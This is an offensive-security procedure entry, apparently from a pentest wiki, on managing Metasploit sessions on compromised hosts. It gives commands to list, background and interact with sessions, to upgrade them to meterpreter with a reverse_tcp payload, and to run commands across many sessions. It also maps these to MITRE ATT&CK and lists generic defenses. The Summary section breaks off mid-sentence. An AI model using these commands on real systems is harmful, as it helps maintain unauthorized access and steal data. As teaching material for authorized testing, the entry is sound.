---
id: d4478798-8427-4129-9807-1375ed7afd8e
name: Session Management with Metasploit
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:21.214097+00:00'
updated_at: '2023-05-26T00:58:31.940456+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Remote Access Tools|T1219 - Remote Access Tools]]'
sub_techniques:
- '[[PowerShell|T1059.001 - PowerShell]]'
tags:
- '[[Metasploit]]'
- '[[Sessions]]'
commands:
- '[[Execute a command on a range of sessions]]'
- '[[Execute a command on multiple sessions]]'
- '[[Interact with a specific session]]'
- '[[List all available sessions]]'
- '[[Session in Background]]'
- '[[Upgrade session to a meterpreter]]'
- '[[Upgrade session to a meterpreter with custom options]]'
---

# Session Management with Metasploit

## Summary

Session management with Metasploit is a technique used by attackers to maintain access to a compromised system. It involves managing the active sessions that have been established with the target machine. With Metasploit, an attacker can create a backdoor on the target system, which allows them to 

## Description

# Description

Session management with Metasploit is a technique used by attackers to maintain access to a compromised system. It involves managing the active sessions that have been established with the target machine. With Metasploit, an attacker can create a backdoor on the target system, which allows them to establish a remote connection and execute commands. This technique is commonly used in post-exploitation activities, such as lateral movement and data exfiltration.

From a technical standpoint, session management with Metasploit involves using the 'sessions' command to view and interact with active sessions. An attacker can use this command to manage multiple sessions at once, including uploading and downloading files, executing commands, and pivoting to other systems on the network. 

The business value of session management with Metasploit is its ability to maintain access to a compromised system, which can lead to further exploitation and data theft.

## Requirements

1. Valid credentials or a vulnerability to exploit

1. Access to the target network

## Defense

1. Implement strict access controls and authentication mechanisms to prevent unauthorized access to systems

1. Monitor network traffic for suspicious activity, such as unexpected connections or data transfers

1. Regularly update and patch systems to reduce the risk of vulnerabilities being exploited

## Objectives

1. Maintain access to a compromised system

1. Execute commands on the target system

1. Upload and download files from the target system

# Instructions

1. To manage sessions, use the 'sessions' command followed by the appropriate option. Use 'CTRL+Z' to put the current session in the background. Use 'sessions' to list all available sessions. Use 'sessions -i session_number' to interact with a specific session. Use 'sessions -u session_number' to upgrade the session to a meterpreter. Use 'sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false' to upgrade the session to a meterpreter with custom options. Use 'sessions -c cmd' to execute a command on multiple sessions. Use 'sessions -i 10-20 -c "id"' to execute a command on a range of sessions.

**Code**: [[CTRL+Z   -> Session in Background
sessions -> List]]

> The 'sessions' command is used to manage sessions in Meterpreter. These sessions represent active connections to a target system. The 'CTRL+Z' key combination is used to put the current session in the background. The 'sessions' command without any options will list all available sessions. The '-i' option followed by a session number is used to interact with a specific session. The '-u' option followed by a session number is used to upgrade the session to a meterpreter. The '-u' option can also be used with custom options such as 'LPORT=4444' and 'PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false'. The '-c' option followed by a command is used to execute a command on multiple sessions. The '-i' option followed by a range of session numbers and the '-c' option followed by a command is used to execute a command on a range of sessions.

**Command** ([[Session in Background]]):

```bash
CTRL+Z
```

**Command** ([[List all available sessions]]):

```bash
sessions
```

**Command** ([[Interact with a specific session]]):

```bash
sessions -i session_number
```

**Command** ([[Upgrade session to a meterpreter]]):

```bash
sessions -u session_number
```

**Command** ([[Upgrade session to a meterpreter with custom options]]):

```bash
sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false
```

**Command** ([[Execute a command on multiple sessions]]):

```bash
sessions -c cmd
```

**Command** ([[Execute a command on a range of sessions]]):

```bash
sessions -i 10-20 -c "id"
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Remote Access Tools|T1219 - Remote Access Tools]]

### Sub-Techniques

- [[PowerShell|T1059.001 - PowerShell]]

## Commands Used

- [[Execute a command on a range of sessions]]
- [[Execute a command on multiple sessions]]
- [[Interact with a specific session]]
- [[List all available sessions]]
- [[Session in Background]]
- [[Upgrade session to a meterpreter]]
- [[Upgrade session to a meterpreter with custom options]]

## Tags

- [[Metasploit]]
- [[Sessions]]
